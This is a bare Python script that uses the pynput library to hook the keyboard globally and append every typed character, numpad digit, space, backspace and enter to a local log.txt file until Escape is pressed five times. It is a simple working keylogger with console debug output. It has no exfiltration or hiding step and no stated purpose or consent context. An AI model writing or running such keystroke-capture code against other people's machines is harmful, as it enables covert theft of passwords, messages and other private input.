from pynput import keyboard
def on_press(key):
    try:
        print('char is {0}'.format(key.char))
        number = -1
        if hasattr(key, 'vk') and 96 <= key.vk <= 105:
            number = int(key.vk)-96
            print('Result :',number)
            
        with open('log.txt','a',encoding='utf-8') as file:
            if key.char == None :
                t ='{}'.format(number)
            else :
                t ='{}'.format(key.char)
            file.write(t)
    except AttributeError:
        print('special key is {0}'.format(key))
        
        if key== key.backspace or key == key.enter or key == key.space :
            print("fais")
            with open('log.txt','a',encoding='utf-8') as file:
                if key == key.backspace :
                    file.write("<-")
                elif key == key.space :
                    file.write(" ")
                elif key == key.enter :
                    file.write("|")
                        
                        
                
                
count = 0 
def on_release(key):
    global count
    if key == keyboard.Key.esc:
        count+=1
        print('count:',count)

    if count>= 5:
        return False

    


with keyboard.Listener(on_press=on_press,on_release=on_release) as listener:
    listener.join()
